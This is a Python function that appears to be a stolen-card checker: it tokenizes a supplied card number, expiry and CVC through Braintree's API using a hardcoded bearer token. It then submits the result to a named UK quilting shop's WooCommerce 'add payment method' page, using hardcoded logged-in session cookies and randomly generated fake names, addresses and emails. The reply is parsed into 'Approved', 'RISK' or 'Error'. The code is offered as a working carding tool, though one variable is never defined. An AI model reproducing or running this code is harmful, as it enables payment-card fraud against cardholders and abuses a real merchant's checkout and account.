def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	r.verify = False
	
	user = user_agent.generate_user_agent()
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
	                   
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    
	    return first_name, last_name
	
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	
	
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
	
	
	def generate_random_code(length=32):
	    letters_and_digits = string.ascii_letters + string.digits
	    return ''.join(random.choice(letters_and_digits) for _ in range(length))
	
	corr = generate_random_code()
	
	sess = generate_random_code()

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,ca-EG;q=0.6,ca;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA5NTc1NDEsImp0aSI6IjkyYTBhNGI0LWMxNTAtNGRiZS1hMDk1LTZmMGQwNzk2YmI5YiIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.Mp2G3LWpjtvX8MpZLDJyOHEwYGvdR0H7OG4zfYZpLbyhk5I28GvUTW2t7UUhpm_jd3-3zU3K4G25YTQMGJcWXA',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '7ee7ff3f-9ee4-41b6-a685-c2298cdbaca1',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


	tok = response.json()['data']['tokenizeCreditCard']['token']

	import requests

	cookies = {
    '_ga': 'GA1.1.357306500.1720102349',
    'tk_ai': 'u2z0M0I5fiMxDrDom5ObkEZ%2B',
    'eucookielaw': '1735654665441',
    'tk_or': '%22%22',
    'tk_lr': '%22%22',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-13%2012%3A42%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-13%2012%3A42%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'yousef.ahmed-8466%7C1722080679%7C9rCsL7BV91PQJS2H0pHdJvBpiaNRs8Je82DNbNbHKK8%7C2d2049d12cf37314872b2f8cf9f81f77f3d66bf5134371627898da23efd365fa',
    'wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29': '210%7C%7C1721043837%7C%7C1721040237%7C%7Cfc69c6c6a6c625f5665feade285863c6',
    'tk_ai': 'jetpack%3AKroCxtn62iwTmB6ONvT%2BYYwG',
    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '210%7Cother%7Cread%7C395207d9782357f2bbc68729e0fd75f46f84185799c72726a0e6169d8108a5d7',
    '_ga_EX1GV7CW1V': 'GS1.1.1720874566.2.1.1720874659.0.0.0',
    'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_347410393': 'GS1.1.1720874566.2.1.1720874714.0.0.0',
    'tk_qs': '',
}

	headers = {
    'authority': 'www.carolyngibbsquilts.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,ca-EG;q=0.6,ca;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.357306500.1720102349; tk_ai=u2z0M0I5fiMxDrDom5ObkEZ%2B; eucookielaw=1735654665441; tk_or=%22%22; tk_lr=%22%22; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-13%2012%3A42%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-13%2012%3A42%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=yousef.ahmed-8466%7C1722080679%7C9rCsL7BV91PQJS2H0pHdJvBpiaNRs8Je82DNbNbHKK8%7C2d2049d12cf37314872b2f8cf9f81f77f3d66bf5134371627898da23efd365fa; wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29=210%7C%7C1721043837%7C%7C1721040237%7C%7Cfc69c6c6a6c625f5665feade285863c6; tk_ai=jetpack%3AKroCxtn62iwTmB6ONvT%2BYYwG; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=210%7Cother%7Cread%7C395207d9782357f2bbc68729e0fd75f46f84185799c72726a0e6169d8108a5d7; _ga_EX1GV7CW1V=GS1.1.1720874566.2.1.1720874659.0.0.0; sbjs_session=pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_347410393=GS1.1.1720874566.2.1.1720874714.0.0.0; tk_qs=',
    'origin': 'https://www.carolyngibbsquilts.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"3afe3621b050e5caa8add4e3a3d95172"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', add_nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post(
    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)



	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	
				
	return result